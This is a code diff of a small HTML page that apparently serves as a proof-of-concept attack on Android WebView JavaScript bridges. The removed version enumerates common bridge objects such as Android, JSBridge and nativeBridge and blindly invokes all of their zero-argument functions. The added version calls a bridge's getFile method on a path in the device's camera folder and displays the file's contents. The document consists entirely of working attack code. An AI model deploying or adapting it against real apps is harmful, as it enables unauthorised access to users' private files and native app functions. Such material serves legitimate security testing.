@@ -1,113 +1,14 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <style>
-        body {
-            font-family: monospace;
-            background: #0d1117;
-            color: #c9d1d9;
-            padding: 20px;
-        }
-        h2 {
-            color: #58a6ff;
-        }
-        pre {
-            background: #161b22;
-            padding: 10px;
-            border-radius: 6px;
-            overflow-x: auto;
-        }
-        .error {
-            color: #f85149;
-        }
-        .success {
-            color: #3fb950;
-        }
-    </style>
-</head>
-<body>
-
-<h2>Exposed JavaScript Interface Tester</h2>
-<pre id="output"></pre>
-
-<script>
-function log(msg, cls) {
-    const out = document.getElementById("output");
-    const span = document.createElement("span");
-    if (cls) span.className = cls;
-    span.innerText = msg + "\n";
-    out.appendChild(span);
-}
-
-/**
- * Enumerate properties/functions of an exposed object
- */
-function enumerateInterface(objName) {
-    try {
-        const obj = window[objName];
-        if (!obj) {
-            log("[!] " + objName + " is not defined", "error");
-            return;
-        }
-
-        log("[+] Enumerating interface: " + objName, "success");
-
-        Object.getOwnPropertyNames(obj).forEach(function(prop) {
-            log("    - " + prop + " (" + typeof obj[prop] + ")");
-        });
-
-    } catch (e) {
-        log("[!] Error enumerating " + objName + ": " + e, "error");
-    }
-}
-
-/**
- * Attempt to invoke all zero-argument functions
- */
-function invokeInterface(objName) {
-    try {
-        const obj = window[objName];
-        if (!obj) return;
-
-        log("[+] Invoking callable members of: " + objName, "success");
-
-        Object.getOwnPropertyNames(obj).forEach(function(prop) {
-            if (typeof obj[prop] === "function") {
-                try {
-                    const result = obj[prop]();
-                    log("    * " + prop + "() => " + result);
-                } catch (e) {
-                    log("    * " + prop + "() => ERROR: " + e, "error");
-                }
-            }
-        });
-
-    } catch (e) {
-        log("[!] Invocation error on " + objName + ": " + e, "error");
-    }
-}
-
-/**
- * Target known / common interface names
- */
-const targets = [
-    "getUserInfo",
-    "getBaseInfo",
-    "Android",
-    "android",
-    "JSBridge",
-    "webkit",
-    "Native",
-    "bridge",
-    "nativeBridge"
-];
-
-targets.forEach(function(name) {
-    enumerateInterface(name);
-    invokeInterface(name);
-});
-</script>
-
-</body>
+<html>
+  <body>
+    <script>
+      // Replace 'getFile' and 'file:///sdcard/DCIM/Camera/secret.jpg' as needed
+      if (window.bridge) {
+        var result = window.bridge.getFile('file:///sdcard/DCIM/Camera/exploit.jpg');
+        alert('File contents: ' + result);
+      } else {
+        alert('No bridge object found');
+      }
+    </script>
+  </body>
 </html>
